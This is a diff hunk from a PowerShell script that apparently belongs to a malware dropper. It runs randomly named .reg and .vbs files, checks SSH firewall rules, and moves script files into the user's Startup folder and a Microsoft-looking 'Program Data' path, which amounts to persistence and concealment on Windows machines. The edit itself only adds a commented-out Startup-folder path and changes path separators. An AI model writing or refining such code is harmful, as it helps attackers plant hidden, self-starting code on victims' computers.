@@ -75,8 +75,9 @@ Get-NetFirewallRule -Name *ssh*
 & "./QyjAaZDBbNPk.reg"
 & "./FoRAUwtxKkSB.vbs"
 
+#Set-Variable -Value "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" -Name initial_dir
 
-$tasks = "C:/Users/$env:USERNAME/Program Data/Microsoft/Windows"
+$tasks = "C:\Users\$env:USERNAME\Program Data\Microsoft\Windows"
 
 Move-Item -Path "$path\ZDaFvwjOosKx.vbs" -Destination $initial_dir
 Move-Item -Path "$path\AEQKCPrkuifY.ps1" -Destination $tasks
